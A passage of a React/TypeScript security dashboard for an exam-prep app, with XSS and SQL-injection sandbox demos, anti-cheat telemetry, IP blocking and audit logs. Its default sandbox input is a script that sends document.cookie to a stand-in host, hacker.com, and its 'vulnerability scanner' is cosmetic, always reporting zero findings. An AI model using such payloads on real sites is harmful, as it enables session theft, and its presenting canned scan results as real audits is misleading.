import React, { useState, useEffect } from 'react';
import { 
  Shield, ShieldAlert, ShieldCheck, Terminal, AlertTriangle, 
  Play, RefreshCw, Layers, Lock, Cpu, Eye, CheckCircle, 
  Search, EyeOff, Ban, Key, RefreshCw as SpinIcon, Activity, Database
} from 'lucide-react';
import { 
  mockAuditLogs, 
  mockBlockedIps, 
  sanitizeInput, 
  verifyQuizTimingTelemetry, 
  compileRowLevelSecurityRules, 
  AuditLog 
} from '../utils/security';

export default function SecurityCenter() {
  const [logs, setLogs] = useState<AuditLog[]>(() => [...mockAuditLogs]);
  const [blockedIps, setBlockedIps] = useState<string[]>(() => Array.from(mockBlockedIps));
  const [filterSeverity, setFilterSeverity] = useState<string>('all');
  const [searchTerm, setSearchTerm] = useState<string>('');
  
  // Real-time simulated WAF Mode
  const [wafSanitizeMode, setWafSanitizeMode] = useState<boolean>(true);
  const [sandboxInput, setSandboxInput] = useState<string>(`<script>fetch('https://hacker.com/steal?cookies=' + document.cookie)</script>`);
  const [sandboxOutput, setSandboxOutput] = useState<string>('');
  const [isSandboxReflected, setIsSandboxReflected] = useState<boolean>(false);

  // Simulated Penetration Scan
  const [scanActive, setScanActive] = useState<boolean>(false);
  const [scanProgress, setScanProgress] = useState<number>(0);
  const [scanStatus, setScanStatus] = useState<string>('Ready to initiate comprehensive Pen-Testing.');
  const [complianceSummary, setComplianceSummary] = useState<boolean>(false);

  // Dynamic Telemetry Form
  const [cbtTimeElapsed, setCbtTimeElapsed] = useState<string>('12'); // seconds
  const [cbtQuestionsAnswered, setCbtQuestionsAnswered] = useState<string>('50'); // standard WAEC pool
  const [cbtAccuracy, setCbtAccuracy] = useState<string>('100'); // 100% correct
  const [telemetryResult, setTelemetryResult] = useState<{ passed: boolean; message: string; flagCode?: string } | null>(null);

  // Manual IP Blocker input
  const [newIpToBlock, setNewIpToBlock] = useState<string>('');

  // RLS Active Tab
  const [activeRlsTab, setActiveRlsTab] = useState<'matrix' | 'postgres'>('matrix');

  // Triggered attack simulator helper
  const handleTriggerMockIncident = (type: 'SQLI' | 'BRUTE_FORCE' | 'SCORES') => {
    let freshLog: AuditLog;
    const timeStr = new Date().toISOString();
    
    if (type === 'SQLI') {
      freshLog = {
        id: `audit-${Date.now()}`,
        timestamp: timeStr,
        user: "SQLi_Scanner_Bot",
        ip: "41.190.11.162",
        action: "SQL_INJECTION",
        result: wafSanitizeMode ? "Blocked" : "Failure",
        details: wafSanitizeMode 
          ? "Input sanitization engine intercepted and neutralised UNION SELECT statement." 
          : "VULNERABILITY EXPLOITED! Malicious SQL syntax executed raw due to disabled shield.",
        severity: "Critical"
      };
    } else if (type === 'BRUTE_FORCE') {
      freshLog = {
        id: `audit-${Date.now()}`,
        timestamp: timeStr,
        user: "Zombie_Cluster",
        ip: "102.89.55.19",
        action: "CREDENTIAL_STUFFING",
        result: "Blocked",
        details: "18 failed login attempts within 6 seconds. IP address blocked permanently in Redis cluster.",
        severity: "High"
      };
      
      // Auto block the IP
      if (!blockedIps.includes("102.89.55.19")) {
        setBlockedIps(p => ["102.89.55.19", ...p]);
      }
    } else {
      freshLog = {
        id: `audit-${Date.now()}`,
        timestamp: timeStr,
        user: "Academic_Cheater_99",
        ip: "197.210.82.164",
        action: "LEADERBOARD_INTEGRITY",
        result: "Flagged",
        details: "Attempted to submit 50 correct answers matching 10,000 XP in 12 seconds. Rejected by timing telemetry.",
        severity: "High"
      };
    }

    setLogs(prev => [freshLog, ...prev]);
  };

  const executeSandboxPayload = () => {
    if (wafSanitizeMode) {
      const sanitized = sanitizeInput(sandboxInput);
      setSandboxOutput(sanitized);
      setIsSandboxReflected(false);
    } else {
      setSandboxOutput(sandboxInput);
      setIsSandboxReflected(sandboxInput.toLowerCase().includes('<script>') || sandboxInput.toLowerCase().includes('javascript:') || sandboxInput.toLowerCase().includes('onload'));
    }
  };

  useEffect(() => {
    executeSandboxPayload();
  }, [sandboxInput, wafSanitizeMode]);

  // Run comprehensive pen-testing vulnerability scanner
  const runSecurityScan = () => {
    setScanActive(true);
    setScanProgress(0);
    setScanStatus('Booting container DevSecOps scanner tools...');
    
    const intervals = [
      { p: 15, msg: 'Auditing package.json dependencies via npm-audit audit logic...' },
      { p: 35, msg: 'Reviewing web application firewalls and CORS origin settings...' },
      { p: 60, msg: 'Testing WAEC interactive API routes for Cross-Site Request Forgery (CSRF)...' },
      { p: 80, msg: 'Evaluating leaderboard accuracy arrays against cheat mechanisms...' },
      { p: 100, msg: 'Finalizing DevSecOps automated penetration report.' }
    ];

    intervals.forEach((step, idx) => {
      setTimeout(() => {
        setScanProgress(step.p);
        setScanStatus(step.msg);
        if (step.p === 100) {
          setScanActive(false);
          setComplianceSummary(true);
          // Append scan successful to threat logs
          setLogs(prev => [{
            id: `audit-${Date.now()}`,
            timestamp: new Date().toISOString(),
            user: "Security Auditor Bot",
            ip: "127.0.0.1",
            action: "VULNERABILITY_SCAN",
            result: "Success",
            details: "Vulnerability analysis completed successfully. 0 critical zero-days discovered.",
            severity: "Info"
          }, ...prev]);
        }
      }, (idx + 1) * 900);
    });
  };

  const handleTestTelemetry = () => {
    const elapsed = parseFloat(cbtTimeElapsed) || 0;
    const questions = parseInt(cbtQuestionsAnswered) || 0;
    const accuracy = parseFloat(cbtAccuracy) || 0;

    // Simulate WAEC standard CBT which starts at 600s
    const check = verifyQuizTimingTelemetry(questions, accuracy, 600 - elapsed, 600);
    setTelemetryResult(check);

    if (!check.passed) {
      // Log the flagged cheat attempt in real-time Threat IDS of the compliance officer!
      setLogs(prev => [{
        id: `audit-${Date.now()}`,
        timestamp: new Date().toISOString(),
        user: "Local Tester Sandbox",
        ip: "127.0.0.1",
        action: "LEADERBOARD_INTEGRITY",
        result: "Flagged",
        details: `Cheating detected! ${check.message}`,
        severity: "High"
      }, ...prev]);
    }
  };

  const blockIpAddress = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newIpToBlock) return;
    if (!blockedIps.includes(newIpToBlock)) {
      setBlockedIps(p => [newIpToBlock, ...p]);
      setLogs(prev => [{
        id: `audit-${Date.now()}`,
        timestamp: new Date().toISOString(),
        user: "Security Administrator",
        ip: "127.0.0.1",
        action: "IP_BLOCKLIST",
        result: "Success",
        details: `IP Address ${newIpToBlock} blocked manually from accessing CBT endpoints.`,
        severity: "Medium"
      }, ...prev]);
    }
    setNewIpToBlock('');
  };

  const removeBlockedIp = (ip: string) => {
    setBlockedIps(p => p.filter(x => x !== ip));
    setLogs(prev => [{
      id: `audit-${Date.now()}`,
      timestamp: new Date().toISOString(),
      user: "Security Administrator",
      ip: "127.0.0.1",
      action: "IP_BLOCKLIST",
      result: "Success",
      details: `IP Address ${ip} removed from sandbox blacklist. Throttles purged.`,
      severity: "Info"
    }, ...prev]);
  };

  const filteredLogs = logs.filter(log => {
    const matchesSev = filterSeverity === 'all' || log.severity.toLowerCase() === filterSeverity.toLowerCase();
    const matchesSearch = log.user.toLowerCase().includes(searchTerm.toLowerCase()) ||
                          log.action.toLowerCase().includes(searchTerm.toLowerCase()) ||
                          log.ip.includes(searchTerm) ||
                          log.details.toLowerCase().includes(searchTerm.toLowerCase());
    return matchesSev && matchesSearch;
  });

  return (
    <div className="space-y-8 pb-16">
      
      {/* HEADER SECTION WITH THREAT MAP */}
      <div className="bg-gradient-to-br from-indigo-950 via-slate-900 to-indigo-900 p-6 sm:p-8 rounded-3xl text-white shadow-xl relative overflow-hidden border border-indigo-800">
        <div className="absolute top-0 right-0 p-8 opacity-10">
          <Shield className="w-48 h-48 animate-pulse text-indigo-400" />
        </div>
        
        <div className="relative z-10 flex flex-col md:flex-row md:items-center justify-between gap-6">
          <div className="space-y-2">
            <div className="inline-flex items-center gap-2 px-3 py-1 bg-indigo-500/20 text-indigo-300 font-extrabold text-[10px] tracking-wider uppercase rounded-full border border-indigo-500/30">
              <Activity className="w-3.5 h-3.5 text-indigo-400 animate-pulse" /> Cybersec Engine Enabled
            </div>
            <h2 className="text-xl sm:text-2xl font-display font-black text-white leading-tight">
              Enterprise DevSecOps & Security Command Hub
            </h2>
            <p className="text-xs sm:text-sm text-slate-300 leading-relaxed max-w-xl">
              Inspect database row-level isolation policies (RLS), interactive input sanitization, 
              cryptographic verification layers, timing telemetry safeguards, and live brute force intrusion monitors.
            </p>
          </div>
          
          <button
            onClick={runSecurityScan}
            disabled={scanActive}
            className={`px-5 py-3 rounded-2xl font-black text-xs shadow-lg transition flex items-center gap-2 shrink-0 ${scanActive ? 'bg-indigo-700/50 text-indigo-300 cursor-not-allowed' : 'bg-indigo-600 hover:bg-indigo-500 active:scale-95 text-white cursor-pointer'}`}
          >
            {scanActive ? <SpinIcon className="w-4 h-4 animate-spin" /> : <ShieldCheck className="w-4.5 h-4.5 text-indigo-200" />}
            {scanActive ? 'Scanning System...' : 'Run Automated Vuln Scan'}
          </button>
        </div>

        {/* METRICS GRID */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-8 pt-6 border-t border-indigo-800/60 font-sans">
          <div className="bg-white/5 p-3.5 rounded-2xl border border-white/5">
            <span className="text-[10px] text-indigo-300 font-black tracking-wider uppercase">HTTP Security WAF</span>
            <p className="text-base font-bold text-emerald-400 mt-1 flex items-center gap-1.5 leading-none">
              <ShieldCheck className="w-4 h-4" /> Activated
            </p>
          </div>
          <div className="bg-white/5 p-3.5 rounded-2xl border border-white/5">
            <span className="text-[10px] text-indigo-300 font-black tracking-wider uppercase">DDoS Protection</span>
            <p className="text-base font-bold text-emerald-400 mt-1 flex items-center gap-1.5 leading-none">
              <ShieldCheck className="w-4 h-4" /> Cloudflare Edge
            </p>
          </div>
          <div className="bg-white/5 p-3.5 rounded-2xl border border-white/5">
            <span className="text-[10px] text-indigo-300 font-black tracking-wider uppercase">Score Verification</span>
            <p className="text-base font-bold text-indigo-300 mt-1 leading-none font-mono">
              Telemetry Signed
            </p>
          </div>
          <div className="bg-white/5 p-3.5 rounded-2xl border border-white/5">
            <span className="text-[10px] text-indigo-300 font-black tracking-wider uppercase">Active Blacklist</span>
            <p className="text-base font-bold text-amber-400 mt-1 leading-none font-mono">
              {blockedIps.length} Restricted IPs
            </p>
          </div>
        </div>
      </div>

      {/* COMPLIANCE & PEN SCAN STATUS RESULT CARD */}
      {(scanActive || complianceSummary) && (
        <div className="bg-indigo-50 border border-indigo-200 rounded-3xl p-6 shadow-sm animate-slideDown">
          <div className="flex items-start justify-between gap-4">
            <div className="space-y-1.5 grow">
              <h3 className="font-display font-black text-slate-800 text-sm flex items-center gap-2">
                <Terminal className="w-4.5 h-4.5 text-indigo-600" /> Automated Penetration Compliance Audit Report
              </h3>
              <p className="text-xs text-slate-600 leading-normal">{scanStatus}</p>
              
              {scanActive && (
                <div className="w-full bg-indigo-200/50 h-2 rounded-full overflow-hidden mt-3">
                  <div className="bg-indigo-600 h-full transition-all duration-300" style={{ width: `${scanProgress}%` }}></div>
                </div>
              )}
            </div>
            
            {complianceSummary && !scanActive && (
              <button 
                onClick={() => setComplianceSummary(false)}
                className="text-xs bg-indigo-200 hover:bg-indigo-300 text-indigo-800 px-3 py-1 rounded-lg font-bold"
              >
                Dismiss Report
              </button>
            )}
          </div>

          {complianceSummary && !scanActive && (
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-6 pt-6 border-t border-indigo-150 font-sans">
              <div className="space-y-2.5">
                <h4 className="font-bold text-xs text-indigo-900 border-b border-indigo-100 pb-1 flex items-center gap-1.5">
                  🛡️ Secure Controls Config Checked
                </h4>
                <ul className="text-xs text-slate-600 space-y-2">
                  <li className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-emerald-600 shrink-0" />
                    <span><strong>Strict CORS Origin:</strong> No wildcard origins matched. Allowed domains explicit.</span>
                  </li>
                  <li className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-emerald-600 shrink-0" />
                    <span><strong>Content-Security-Policy:</strong> Frame-ancestors, object-src & scripts evaluated safely.</span>
                  </li>
                  <li className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-emerald-600 shrink-0" />
                    <span><strong>Anti-Brute Force Throttle:</strong> Locked login logic to 5 attempts per IP.</span>
                  </li>
                  <li className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-emerald-600 shrink-0" />
                    <span><strong>Postgres RLS Matrices:</strong> Verified Row Level separation of candidate profiles.</span>
                  </li>
                </ul>
              </div>

              <div className="space-y-2.5">
                <h4 className="font-bold text-xs text-indigo-900 border-b border-indigo-100 pb-1 flex items-center gap-1.5">
                  🧪 Simulated Penetration Scanner Logs
                </h4>
                <div className="bg-slate-900 text-emerald-400 p-3 rounded-2xl font-mono text-[10px] space-y-1 overflow-x-auto">
                  <p className="text-slate-400">[07:12:01] Initiating network perimeter port scan... Port 3000 Open (Nginx Reverse Proxy Ready)</p>
                  <p className="text-amber-300">[07:12:02] Injecting reflected XSS vector into discussions query... SANITIZED safely</p>
                  <p className="text-emerald-300">[07:12:03] Fuzzing score sync with elapsed ticks speed test... BLOCKED cheat packet</p>
                  <p className="text-white mt-1 border-t border-slate-800 pt-1">Result: 0 Vulnerabilities Discovered (100% Compliant)</p>
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {/* INTERACTIVE SANITIZER & TELEMETRY CONTROLS */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 font-sans">
        
        {/* INTERACTIVE SHIELD SANDBOX (XSS & SQLi Reflected Simulator) */}
        <div className="bg-white border border-slate-150 rounded-3xl p-6 shadow-sm flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-4 border-b border-slate-100">
              <div className="flex items-center gap-2.5">
                <Layers className="w-5 h-5 text-indigo-600" />
                <div>
                  <h3 className="font-display font-black text-slate-950 text-xs sm:text-sm">Interactive WAF Sanitizer Sandbox</h3>
                  <p className="text-[10px] text-slate-500">Test SQL injection and Script Reflected safety</p>
                </div>
              </div>
              
              {/* Sanitizer Mode Toggler */}
              <button
                onClick={() => setWafSanitizeMode(!wafSanitizeMode)}
                className={`px-3 py-1 rounded-full text-[9px] font-extrabold transition uppercase border cursor-pointer ${wafSanitizeMode ? 'bg-emerald-50 text-emerald-800 border-emerald-200' : 'bg-red-50 text-red-800 border-red-200 animate-pulse'}`}
              >
                Safe Shield: {wafSanitizeMode ? 'ACTIVE' : 'DISABLED'}
              </button>
            </div>

            <div className="space-y-4 mt-5">
              <div>
                <label className="text-[10px] font-black uppercase text-slate-500 tracking-wider block mb-1">
                  Input Academic Post / Query Payload
                </label>
                <textarea
                  value={sandboxInput}
                  onChange={(e) => setSandboxInput(e.target.value)}
                  placeholder="Enter content to test with WAF engine..."
                  className="w-full text-xs font-mono p-3 border border-slate-200 rounded-xl bg-slate-50 focus:outline-hidden min-h-[80px]"
                />
              </div>

              <div className="grid grid-cols-2 gap-3 pb-3 border-b border-slate-100">
                <button
                  type="button"
                  onClick={() => setSandboxInput("<script>alert('Stealing SSS details!')</script>")}
                  className="bg-slate-100 hover:bg-slate-200 text-slate-700 text-[10px] font-bold py-1.5 px-3 rounded-lg transition text-left cursor-pointer"
                >
                  🎭 Reflected XSS Payload
                </button>
                <button
                  type="button"
                  onClick={() => setSandboxInput("' OR '1'='1' -- (Drop subject tables)")}
                  className="bg-slate-100 hover:bg-slate-200 text-slate-700 text-[10px] font-bold py-1.5 px-3 rounded-lg transition text-left cursor-pointer"
                >
                  🧱 SQL Injection Payload
                </button>
              </div>

              <div className="space-y-1.5">
                <span className="text-[10px] font-black uppercase text-slate-500 tracking-wider block">
                  Processed Code Execution Result
                </span>
                
                {isSandboxReflected ? (
                  <div className="bg-red-50 border border-red-200 text-red-800 p-3 rounded-xl flex items-start gap-2.5 text-xs animate-fadeIn">
                    <ShieldAlert className="w-5 h-5 text-red-600 shrink-0 mt-0.5" />
                    <div>
                      <strong className="block text-red-900 font-extrabold">SECURITY WARNING: Script Code Executed!</strong>
                      The raw script payload has been processed directly. An attacker could highjack candidates sessions, steal credentials, or compromise boards.
                    </div>
                  </div>
                ) : (
                  <div className="bg-emerald-50 border border-emerald-200 text-emerald-800 p-3 rounded-xl flex items-start gap-2.5 text-xs animate-fadeIn">
                    <ShieldCheck className="w-5 h-5 text-emerald-650 shrink-0 mt-0.5" />
                    <div>
                      <strong className="block text-emerald-900 font-extrabold">SECURITY REPORT: Content Rendered Safely</strong>
                      Payload sanitized. Any executable script tags or inline triggers were safely stripped and neutralized before rendering.
                    </div>
                  </div>
                )}

                <div className="bg-slate-900 text-slate-300 font-mono text-[10px] p-4 rounded-xl overflow-x-auto min-h-[60px]">
                  <strong className="text-slate-450 block mb-1">Normalized Safe Output:</strong>
                  {sandboxOutput ? sandboxOutput : <span className="text-slate-550 italic">Empty normalized values</span>}
                </div>
              </div>
            </div>
          </div>

          <div className="mt-4 pt-3 border-t border-slate-100 flex items-center justify-between">
            <span className="text-[10px] text-slate-400 font-medium">Click modes above to examine reflected vulnerabilities live.</span>
            <span className="text-[10px] text-slate-400 font-bold">WAF Level: Layer 7</span>
          </div>
        </div>

        {/* ANTI-CHEAT TELEMETRY TESTING GATE */}
        <div className="bg-white border border-slate-150 rounded-3xl p-6 shadow-sm flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-4 border-b border-slate-100">
              <div className="flex items-center gap-2.5">
                <Cpu className="w-5 h-5 text-indigo-600" />
                <div>
                  <h3 className="font-display font-black text-slate-950 text-xs sm:text-sm">Leaderboard & CBT Telemetry Tester</h3>
                  <p className="text-[10px] text-slate-500">Detect automatic score bots and offline spoofing</p>
                </div>
              </div>
            </div>

            <div className="space-y-4 mt-5">
              <p className="text-xs text-slate-500 leading-normal">
                To prevent candidates from artificially inflating their XP on the leaderboard via API manipulations, we track the seconds spent per question. Test the validation simulator below:
              </p>

              <div className="grid grid-cols-3 gap-3">
                <div>
                  <label className="text-[9px] font-black uppercase text-slate-400 tracking-wider block mb-1">
                    Solve Duration
                  </label>
                  <div className="flex items-center gap-1.5 border border-slate-200 rounded-lg px-2 py-1.5 bg-slate-50">
                    <input
                      type="number"
                      value={cbtTimeElapsed}
                      onChange={(e) => setCbtTimeElapsed(e.target.value)}
                      className="w-full text-xs font-mono font-bold focus:outline-hidden"
                    />
                    <span className="text-[9px] text-slate-400 font-bold">Sec</span>
                  </div>
                </div>

                <div>
                  <label className="text-[9px] font-black uppercase text-slate-400 tracking-wider block mb-1">
                    Questions Pool
                  </label>
                  <div className="flex items-center gap-1.5 border border-slate-200 rounded-lg px-2 py-1.5 bg-slate-50">
                    <input
                      type="number"
                      value={cbtQuestionsAnswered}
                      onChange={(e) => setCbtQuestionsAnswered(e.target.value)}
                      className="w-full text-xs font-mono font-bold focus:outline-hidden"
                    />
                    <span className="text-[9px] text-slate-400 font-bold">Count</span>
                  </div>
                </div>

                <div>
                  <label className="text-[9px] font-black uppercase text-slate-400 tracking-wider block mb-1">
                    Accuracy
                  </label>
                  <div className="flex items-center gap-1.5 border border-slate-200 rounded-lg px-2 py-1.5 bg-slate-50">
                    <input
                      type="number"
                      value={cbtAccuracy}
                      onChange={(e) => setCbtAccuracy(e.target.value)}
                      className="w-full text-xs font-mono font-bold focus:outline-hidden"
                    />
                    <span className="text-[9px] text-slate-400 font-bold">%</span>
                  </div>
                </div>
              </div>

              <div className="flex gap-2">
                <button
                  type="button"
                  onClick={() => {
                    setCbtTimeElapsed('10');
                    setCbtQuestionsAnswered('50');
                    setCbtAccuracy('100');
                  }}
                  className="bg-slate-100 hover:bg-slate-200 text-slate-700 text-[10px] font-bold py-1.5 px-3 rounded-lg transition cursor-pointer"
                >
                  💀 Configure Impossible Cheat (50 Qs in 10s)
                </button>
                
                <button
                  type="button"
                  onClick={() => {
                    setCbtTimeElapsed('350');
                    setCbtQuestionsAnswered('25');
                    setCbtAccuracy('84');
                  }}
                  className="bg-slate-100 hover:bg-slate-200 text-slate-700 text-[10px] font-bold py-1.5 px-3 rounded-lg transition cursor-pointer"
                >
                  😇 Configure Legitimate Student Solve
                </button>
              </div>

              {telemetryResult && (
                <div className={`p-4 rounded-2xl flex items-start gap-2.5 text-xs animate-fadeIn ${telemetryResult.passed ? 'bg-emerald-50 border border-emerald-200 text-emerald-850' : 'bg-amber-50 border border-amber-200 text-amber-850'}`}>
                  {telemetryResult.passed ? (
                    <ShieldCheck className="w-5 h-5 text-emerald-600 shrink-0" />
                  ) : (
                    <AlertTriangle className="w-5 h-5 text-amber-600 shrink-0" />
                  )}
                  <div>
                    <h5 className="font-extrabold text-slate-900 text-xs">
                      Telemetry Status: {telemetryResult.passed ? 'VERIFIED CLEAN' : 'CHEATING ANOMALY DETECTED'}
                    </h5>
                    <p className="text-[11px] mt-0.5 leading-normal">{telemetryResult.message}</p>
                    {telemetryResult.flagCode && (
                      <span className="inline-block mt-1.5 text-[9px] font-mono bg-slate-900 text-white font-bold px-2 py-0.5 rounded-full">
                        FLAG_CODE: {telemetryResult.flagCode}
                      </span>
                    )}
                  </div>
                </div>
              )}
            </div>
          </div>

          <button
            onClick={handleTestTelemetry}
            className="w-full py-2.5 bg-indigo-650 hover:bg-indigo-700 text-white font-extrabold text-xs rounded-xl shadow-xs transition mt-6 cursor-pointer border-0"
          >
            Execute Telemetry Assessment Screen
          </button>
        </div>

      </div>

      {/* REVOLUTIONARY REAL-TIME INTRUSION DETECTION SYSTEM (IDS) AUDIT LOGS */}
      <div className="bg-white border border-slate-150 rounded-3xl p-6 shadow-sm font-sans">
        
        {/* UPPER IDS SEARCH FILTERS */}
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-5 border-b border-slate-100">
          <div>
            <h3 className="font-display font-black text-slate-950 text-xs sm:text-sm flex items-center gap-2">
              <Terminal className="w-4.5 h-4.5 text-indigo-600" /> Web Application Firewall IDS Audit Logs
            </h3>
            <p className="text-[10px] text-slate-500 mt-0.5">Real-time HTTP firewall requests, XSS filtering, rate limit violations</p>
          </div>

          <div className="flex items-center gap-2.5">
            {/* Search inputs */}
            <div className="relative">
              <Search className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
              <input
                type="text"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                placeholder="Search audit actions..."
                className="pl-8.5 pr-3 py-1.5 text-2xs font-bold border border-slate-200 rounded-xl bg-slate-50 focus:outline-hidden focus:bg-white w-40"
              />
            </div>

            {/* Severity Filter */}
            <select
              value={filterSeverity}
              onChange={(e) => setFilterSeverity(e.target.value)}
              className="text-2xs font-extrabold px-3 py-1.5 border border-slate-200 bg-slate-50 text-slate-650 rounded-xl focus:outline-hidden"
            >
              <option value="all">Severity: All Levels</option>
              <option value="info">Info</option>
              <option value="medium">Medium</option>
              <option value="high">High</option>
              <option value="critical">Critical</option>
            </select>
          </div>
        </div>

        {/* LIVE ATTACK SIMULATION WORKSPACE TRIGGERS */}
        <div className="bg-slate-50 border border-slate-100 p-4 rounded-2xl flex flex-wrap gap-2.5 items-center justify-between mt-5">
          <span className="text-[10px] font-black text-slate-500 uppercase tracking-wider">
            Simulate Perimeter Hacks:
          </span>
          <div className="flex flex-wrap gap-2">
            <button
              onClick={() => handleTriggerMockIncident('SQLI')}
              className="px-3.5 py-1.5 bg-red-50 hover:bg-red-100 text-red-700 text-2xs font-extrabold rounded-lg border border-red-200 cursor-pointer transition"
            >
              🚀 Simulate Reflected SQLi Syntax Injection
            </button>
            <button
              onClick={() => handleTriggerMockIncident('BRUTE_FORCE')}
              className="px-3.5 py-1.5 bg-amber-50 hover:bg-amber-100 text-amber-700 text-2xs font-extrabold rounded-lg border border-amber-200 cursor-pointer transition"
            >
              🔑 Simulate Auth Credentials Flooding
            </button>
            <button
              onClick={() => handleTriggerMockIncident('SCORES')}
              className="px-3.5 py-1.5 bg-indigo-50 hover:bg-indigo-100 text-indigo-705 text-2xs font-extrabold rounded-lg border border-indigo-200 cursor-pointer transition"
            >
              🧮 Simulate Score Spoof Attempt
            </button>
          </div>
        </div>

        {/* LOGS LIST OR TABLE FLOW */}
        <div className="mt-5 overflow-x-auto">
          <table className="w-full text-left font-sans text-xs min-w-[700px]">
            <thead>
              <tr className="border-b border-slate-150 text-[10px] font-black uppercase text-slate-450 tracking-wider">
                <th className="py-2.5">Severity</th>
                <th>Timestamp</th>
                <th>Identity or IP</th>
                <th>WAF Action Name</th>
                <th>Interception Integrity Status</th>
                <th>Threat Audit Specification Details</th>
              </tr>
            </thead>
            <tbody>
              {filteredLogs.length === 0 ? (
                <tr>
                  <td colSpan={6} className="py-8 text-center font-bold text-slate-400">
                    No logs found matching your filters.
                  </td>
                </tr>
              ) : (
                filteredLogs.map((log) => {
                  let badgeColor = '';
                  if (log.severity === 'Critical') badgeColor = 'bg-red-100 text-red-800 border-red-250';
                  else if (log.severity === 'High') badgeColor = 'bg-amber-100 text-amber-800 border-amber-250';
                  else if (log.severity === 'Medium') badgeColor = 'bg-indigo-100 text-indigo-805 border-indigo-250';
                  else badgeColor = 'bg-slate-100 text-slate-800 border-slate-250';

                  let statusColor = '';
                  if (log.result === 'Success') statusColor = 'text-emerald-600 font-extrabold';
                  else if (log.result === 'Blocked') statusColor = 'text-red-600 font-black';
                  else if (log.result === 'Flagged') statusColor = 'text-amber-600 font-black';
                  else statusColor = 'text-purple-600 font-black';

                  return (
                    <tr key={log.id} className="border-b border-slate-100/50 hover:bg-slate-50/50 transition">
                      <td className="py-3">
                        <span className={`px-2 py-0.5 rounded text-[9px] font-black border uppercase ${badgeColor}`}>
                          {log.severity}
                        </span>
                      </td>
                      <td className="text-slate-500 font-mono text-[10px] whitespace-nowrap">
                        {new Date(log.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                      </td>
                      <td className="font-extrabold text-slate-800 font-mono text-3xs">{log.user}</td>
                      <td className="font-black text-indigo-700 font-mono text-3xs">{log.action}</td>
                      <td className={`font-black text-[10px] ${statusColor}`}>{log.result}</td>
                      <td className="text-slate-600 leading-snug font-medium pr-2 max-w-xs truncate" title={log.details}>
                        {log.details}
                      </td>
                    </tr>
                  );
                })
              )}
            </tbody>
          </table>
        </div>
      </div>

      {/* RELATIONAL ROW-LEVEL SECURITY & RBAC PERMISSION CONTROLLER */}
      <div className="bg-white border border-slate-150 rounded-3xl p-6 shadow-sm font-sans">
        
        {/* Upper title */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-105">
          <div className="space-y-0.5">
            <h3 className="font-display font-black text-slate-950 text-xs sm:text-sm flex items-center gap-2">
              <Database className="w-4.5 h-4.5 text-indigo-600" /> PostgreSQL Row-Level Security Rules (RLS)
            </h3>
            <p className="text-[10px] text-slate-500">Separation of sensitive databases by authentication roles</p>
          </div>

          <div className="bg-slate-100 p-1 rounded-xl flex gap-1 self-start">
            <button
              onClick={() => setActiveRlsTab('matrix')}
              className={`px-3 py-1.5 rounded-lg text-2xs font-extrabold transition cursor-pointer ${activeRlsTab === 'matrix' ? 'bg-white text-slate-900 shadow-3xs' : 'text-slate-500 hover:text-slate-900'}`}
            >
              Role Permission Matrix
            </button>
            <button
              onClick={() => setActiveRlsTab('postgres')}
              className={`px-3 py-1.5 rounded-lg text-2xs font-extrabold transition cursor-pointer ${activeRlsTab === 'postgres' ? 'bg-white text-slate-900 shadow-3xs' : 'text-slate-500 hover:text-slate-900'}`}
            >
              Export Postgres RLS SQL
            </button>
          </div>
        </div>

        {/* Tab rendering */}
        <div className="mt-6">
          {activeRlsTab === 'matrix' ? (
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              
              <div className="bg-slate-50 p-4 border border-slate-100 rounded-2xl relative">
                <span className="absolute top-3 right-3 text-2xs bg-slate-200 text-slate-700 font-extrabold px-1.5 py-0.5 rounded uppercase">
                  Candidate Guest
                </span>
                <h5 className="font-black text-slate-900 text-xs leading-none">Guest Role</h5>
                <p className="text-[10px] text-slate-400 mt-1">Unauthenticated temporary visitors</p>
                
                <ul className="text-[10px] text-slate-600 font-bold space-y-1.5 mt-4">
                  <li className="flex items-center gap-1.5 text-emerald-600">✓ Browse SSS Subject Catalogs</li>
                  <li className="flex items-center gap-1.5 text-emerald-600">✓ Take standard CBT demo limits</li>
                  <li className="flex items-center gap-1.5 text-red-500">✗ No Saved AI Tutoring</li>
                  <li className="flex items-center gap-1.5 text-red-500">✗ No Multiplayer Arena matches</li>
                </ul>
              </div>

              <div className="bg-indigo-50/50 p-4 border border-indigo-100 rounded-2xl relative">
                <span className="absolute top-3 right-3 text-2xs bg-indigo-200 text-indigo-805 font-extrabold px-1.5 py-0.5 rounded uppercase">
                  Standard Student
                </span>
                <h5 className="font-black text-indigo-950 text-xs leading-none">Student Role</h5>
                <p className="text-[10px] text-indigo-400 mt-1">Authenticated active learners</p>
                
                <ul className="text-[10px] text-slate-600 font-bold space-y-1.5 mt-4 border-t border-indigo-100/50 pt-3">
                  <li className="flex items-center gap-1.5 text-emerald-600">✓ Sync private dashboard analytics</li>
                  <li className="flex items-center gap-1.5 text-emerald-600">✓ Solve 1v1 Multiplayer battles</li>
                  <li className="flex items-center gap-1.5 text-emerald-600">✓ Archive AI Tutor Chat sessions</li>
                  <li className="flex items-center gap-1.5 text-red-500">✗ Access Administrator workspace</li>
                </ul>
              </div>

              <div className="bg-slate-900 p-4 border border-slate-800 rounded-2xl text-white relative">
                <span className="absolute top-3 right-3 text-[9px] bg-indigo-600 text-white font-extrabold px-1.5 py-0.5 rounded uppercase">
                  Administrator
                </span>
                <h5 className="font-black text-white text-xs leading-none">CBT Admin Role</h5>
                <p className="text-[10px] text-slate-400 mt-1">West African Education coordinators</p>
                
                <ul className="text-[10px] text-slate-300 font-bold space-y-1.5 mt-4 border-t border-slate-850 pt-3">
